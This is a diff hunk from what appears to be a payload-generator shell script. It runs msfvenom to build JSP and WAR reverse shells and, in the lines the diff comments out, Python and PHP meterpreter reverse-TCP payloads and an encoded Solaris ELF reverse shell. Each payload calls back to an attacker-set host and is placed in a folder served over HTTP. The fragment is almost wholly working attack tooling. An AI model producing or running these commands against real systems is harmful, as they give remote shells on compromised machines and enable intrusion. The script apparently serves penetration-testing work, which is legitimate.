@@ -118,12 +118,12 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/p
 echo "${BESTAND}_${PORT}.jsp :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > http/payloads/${BESTAND}_${PORT}.war
 echo "${BESTAND}_${PORT}.war :: java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/tcp${BESTAND}_${PORT}.py
-echo "tcp${BESTAND}_${PORT}.py :: payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
-msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php 
-echo "meterpreter_${PORT}.php :: php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw " >> http/payloads/${BESTAND}_${PORT}.txt 
-msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b '\x00' > http/payloads/solaris_${PORT}.elf
-echo "${BESTAND}_reverse_tcp.elf :: platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b \x00" >> http/payloads/${BESTAND}_${PORT}.txt 
+#msfvenom -p payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/tcp${BESTAND}_${PORT}.py
+#echo "tcp${BESTAND}_${PORT}.py :: payload/python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw" >> http/payloads/${BESTAND}_${PORT}.txt
+#msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php 
+#echo "meterpreter_${PORT}.php :: php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw " >> http/payloads/${BESTAND}_${PORT}.txt 
+#msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b '\x00' > http/payloads/solaris_${PORT}.elf
+#echo "${BESTAND}_reverse_tcp.elf :: platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b \x00" >> http/payloads/${BESTAND}_${PORT}.txt 
 
 
 
